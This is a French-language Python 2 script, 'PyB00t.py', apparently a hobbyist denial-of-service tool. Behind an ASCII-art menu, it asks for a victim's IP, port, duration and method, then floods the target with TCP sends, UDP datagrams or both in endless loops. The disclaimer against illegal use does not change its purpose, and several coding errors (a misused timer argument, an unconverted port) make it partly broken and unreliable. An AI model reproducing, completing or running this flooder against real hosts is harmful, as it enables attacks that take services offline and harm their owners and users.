#!/usr/bin/python
# -*-coding:Utf-8 -*
#Script developpé par Eloi non destiné a des fins illégaux !

import time
import random
import os
import socket

import math
import sys
import threading
import re
import urllib
import  ssl
import multiprocessing
import getopt

#Fonction pour clear la console
def clear():
	os.system('cls' if os.name=='nt' else 'clear')

def quit():
	clear()
	print("""                    _       _                  _             _   """)
	time.sleep(0.2)
	print("""         /\        | |     (_)                | |           | |  """)
	time.sleep(0.1)
	print("""        /  \       | |__    _    ___   _ __   | |_    ___   | |_ """)
	time.sleep(0.1)
	print("""       / /\ \      | '_ \  | |  / _ \ | '_ \  | __|  / _ \  | __|""")
	time.sleep(0.1)
	print("""      / ____ \     | |_) | | | |  __/ | | | | | |_  | (_) | | |_ """)
	time.sleep(0.1)
	print("""     /_/    \_\    |_.__/  |_|  \___| |_| |_|  \__|  \___/   \__|""")
	time.sleep(1)
	clear()

def home():
	clear()
	print("""
\033[95m    d8888b. db    db d8888b.  .d88b.   .d88b.  d888888b 
    88  `8D `8b  d8' 88  `8D .8P  88. .8P  88. `~~88~~' 
    88oodD'  `8bd8'  88oooY' 88  d'88 88  d'88    88    
    88~~~      88    88~~~b. 88 d' 88 88 d' 88    88    
    88         88    88   8D `88  d8' `88  d8'    88    \033[92mPar Eloi - PyB00t.py\033[0m\033[95m
    88         YP    Y8888P'  `Y88P'   `Y88P'     YP    \033[0m


	\033[91m1) Lancer une attaque
	
	99) Quitter PyB00T
		\033[0m""")
	
	query = raw_input("\033[95mPyB00T > \033[0m")
	
	if query == "1":
		clear()
		start_attack()
	elif query == "99":
		quit()
	else:
		print("Cette option n'existe pas !")
		time.sleep(0.5)
		home()




def start_attack():

	def finddos():
		global on
		on = False

	#demande de la methode
	print("""\033[91m
         _      _     _                    _    
        / \    | |_  | |_    __ _    ___  | | __
       / _ \   | __| | __|  / _` |  / __| | |/ /
      / ___ \  | |_  | |_  | (_| | | (__  |   <      \033[92mPyB00t.py - Par Eloi\033[91m
     /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                                
\033[0m


\033[92mEntrez la méthode voulue:
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
1) tcp
2) udp
\033[91m3) Les deux (Mode Bourrin)\033[92m
""")
	methQuery = raw_input("Methode > \033[0m")

	if methQuery == "1":
		methode = 1
		methodePrint = "tcp"
	elif methQuery == "2":
		methode = 2
		methodePrint = "udp"
	elif methQuery == "3":
		methode = 3
		methodePrint = "\033[91mLes Deux !\033[0m"
	else:
		clear()
		print("\033[91mErreure lors du choix de la méthode\033[0m")
		time.sleep(0.5)
		start_attack()



	#demande de l'ip
	clear()
	print("""\033[91m
         _      _     _                    _    
        / \    | |_  | |_    __ _    ___  | | __
       / _ \   | __| | __|  / _` |  / __| | |/ /
      / ___ \  | |_  | |_  | (_| | | (__  |   <      \033[92mPyB00t.py - Par Eloi\033[91m
     /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                                
\033[0m


\033[92mEntrez l'ip de votre victime: """)
	ip = raw_input("IP > \033[0m")
	
	
	#Demande du port
	clear()
	print("""\033[91m
         _      _     _                    _    
        / \    | |_  | |_    __ _    ___  | | __
       / _ \   | __| | __|  / _` |  / __| | |/ /
      / ___ \  | |_  | |_  | (_| | | (__  |   <      \033[92mPyB00t.py - Par Eloi\033[91m
     /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                                
\033[0m


\033[92mEntrez le port de votre victime (defaut 80): """)
	port = raw_input("Port > \033[0m")
	
	


	#demande du temps
	clear()
	print("""\033[91m
         _      _     _                    _    
        / \    | |_  | |_    __ _    ___  | | __
       / _ \   | __| | __|  / _` |  / __| | |/ /
      / ___ \  | |_  | |_  | (_| | | (__  |   <      \033[92mPyB00t.py - Par Eloi\033[91m
     /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                                
\033[0m


\033[92mEntrez le temps de l'attaque en secondes: """)
	timeVar = raw_input("Temps > \033[0m")
	

	
	#recapitulatif
	clear()
	print("""\033[91m
         _      _     _                    _    
        / \    | |_  | |_    __ _    ___  | | __
       / _ \   | __| | __|  / _` |  / __| | |/ /
      / ___ \  | |_  | |_  | (_| | | (__  |   <      \033[92mPyB00t.py - Par Eloi\033[91m
     /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                                
\033[0m""")
	print "Methode:", methodePrint
	print "IP:", ip
	print "Port: ", port
	if timeVar == "1":
		print "Temps: ", timeVar, "seconde"
	else:
		print "Temps: ", timeVar, "secondes"
	print("")
	print("""\033[92mLancer l'attaque:
	1) Oui
	\033[91m2) Annuler\033[92m
""")

	start = raw_input("> \033[0m")
	
	if start == "1":
		if methQuery == "1":#Methode tcp
			print("""Demarage de l'attaque...""")
			tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			tcp.connect((ip, port))
			on = True
			timer = threading.Timer(time, finddos)
			timer.start()
			while on:
				tcp.send(b"mangeAuMoins5FruitsEtEtlgumesParJours")
			tcp.close()
		elif methQuery == "2":#Methode udp
			print("UDP: " + str(ip) + ":" + str(port) + " " + str(time) + "sec")
			udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			on = True
			timer = threading.Timer(time, finddos)
			timer.start()
			while on:
				udp.sendto(b"mangeAuMoins5FruitsEtEtlgumesParJours",(ip, port))
		elif methQuery == "3":#Mode bourin (les deux)
			udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			tcp.connect((ip, port))
			on = True
			timer = threading.Timer(time, finddos)
			timer.start()
			while on:
				udp.sendto(b"mangeAuMoins5FruitsEtEtlgumesParJours",(ip, port))
				tcp.send(b"mangeAuMoins5FruitsEtEtlgumesParJours")#PS si tu regarde le code je savais vraiment pas quoi mettre...
			tcp.close()
		else:
			print("\033[91mErreure !")

	elif start == "2":
		home()
	else:
		home()



#"Executer" le script:
home()

